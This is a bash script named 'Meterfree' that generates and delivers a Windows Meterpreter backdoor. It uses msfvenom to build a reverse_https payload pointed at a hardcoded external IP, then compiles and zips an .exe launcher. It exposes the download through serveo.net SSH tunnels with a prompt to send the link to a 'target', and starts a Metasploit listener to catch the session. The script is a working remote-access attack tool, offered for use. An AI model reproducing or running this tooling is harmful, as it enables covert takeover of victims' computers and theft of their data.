#!/bin/bash
# Meterfree v1.0
# coded by: @linux_choice
# github.com/thelinuxchoice/meterfree
# If you use any part from this code, give the credits. Read Lincense!

trap 'printf "\n";stop' 2

banner() {


# cowsay++
printf " __________________________________________________ \n"
printf " \e[1;77m                   __            ____              \n"
printf "    ____ ___  ___  / /____  _____/ __/_______  ___  \n"
printf "   / __ \`__ \/ _ \/ __/ _ \/ ___/ /_/ ___/ _ \/ _ \ \n"
printf "  / / / / / /  __/ /_/  __/ /  / __/ /  /  __/  __/ \n"
printf " /_/ /_/ /_/\___/\__/\___/_/  /_/ /_/   \___/\___/  \e[0m\n"
printf " ------------------------------------------------- \n"
printf "                             \   ,__, \n"
printf "                              \  (oo)____ \n"
printf " \e[1;77mv1.0\e[0m                            (__)    )\ \n"
printf "\e[1;92m Coded by\e[0m\e[1;77m @linux_choice\e[0m             ||--|| * \n"
printf "\e[1;77m github.com/thelinuxchoice/meterfree\e[0m\n"

printf "\n"



}

stop() {

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {

command -v msfconsole > /dev/null 2>&1 || { echo >&2 "I require Metasploit but it's not installed. Install it. Aborting."; exit 1; }
command -v msfvenom > /dev/null 2>&1 || { echo >&2 "I require MSFVenom but it's not installed. Install it. Aborting."; exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; } 
command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Install it: apt-get update && apt-get install mingw-w64"; 
exit 1; }

}


server() {


printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$ddefault_port2':localhost:4444 -R '$ddefault_port1':localhost:'$lport' 2> /dev/null > sendlink ' &
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m]\e[0m\e[1;92m TCP Forwarding:\e[0m\e[1;77m serveo.net:%s/\e[0m\n" $ddefault_port1
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m]\e[0m\e[1;92m TCP Forwarding:\e[0m\e[1;77m serveo.net:%s/\e[0m\n" $ddefault_port2
sleep 8
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s/%s.zip \n' $send_link $payload_name
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/$payload_name.exe | head -n1)
sleep 3
#printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Starting php server1... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 4
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Starting php server2... (localhost:4444)\e[0m\n" 
fuser -k 4444/tcp > /dev/null 2>&1
php -S localhost:4444  > /dev/null 2>&1 &
sleep 4
printf "\n"
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Starting MSF Listener...\e[0m\n'
printf "\n"

}


listener() {
default_listr="Y"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Start Server and MSF Listener?\e[0m\e[1;77m [Y/n]: ' listr
listr="${listr:-${default_listr}}"
if [[ $listr == Y || $listr == y || $listr == Yes || $listr == yes ]]; then
printf "use exploit/multi/handler\n" > handler.rc
printf "set payload windows/meterpreter/reverse_https\n" >> handler.rc
printf "set LHOST 127.0.0.1\n" >> handler.rc
printf "set LPORT %s\n" $lport >> handler.rc
printf "set ExitOnSession false\n" >> handler.rc
printf "exploit -j -z\n" >> handler.rc
server
msfconsole -r handler.rc
rm -rf handler.rc
fi
}

payload() {

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Generating payload with msfvenom\e[0m\n"
msfvenom -p windows/meterpreter/reverse_https lhost="159.89.214.31" lport=$default_port1 -f psh-cmd -o msfven.txt > /dev/null 2>&1 

sed 's+%COMSPEC%+cmd.exe +g' msfven.txt > meterp.txt
sed 's+serveo_port+'$default_port2'+g' msf.c > meterfree.c
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Compiling launcher (exe file)\e[0m\n"
i686-w64-mingw32-gcc meterfree.c -o $payload_name.exe
if [[ -e $payload_name.exe ]]; then
zip $payload_name.zip $payload_name.exe > /dev/null 2>&1
listener
else
printf "\e[1;93mError compiling\e[0m\n"
fi

}

start() {
default_port1=$(seq 1111 4444 | sort -R | head -n1)
default_lport=$(seq 1111 4444 | sort -R | head -n1)
default_port2=$(seq 1111 4444 | sort -R | head -n1)
default_port3=$(seq 1111 4444 | sort -R | head -n1)
lport="${lport:-${default_lport}}"
port="${port:-${default_port}}"
default_payload_name="meterfree"
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_name

read payload_name
payload_name="${payload_name:-${default_payload_name}}"

printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Serveo Port1 (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port1
read ddefault_port1
ddefault_port1="${ddefault_port1:-${default_port1}}"

printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Serveo Port1 (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port2
read ddefault_port2
ddefault_port2="${ddefault_port2:-${default_port2}}"

payload

}
banner
dependencies
start

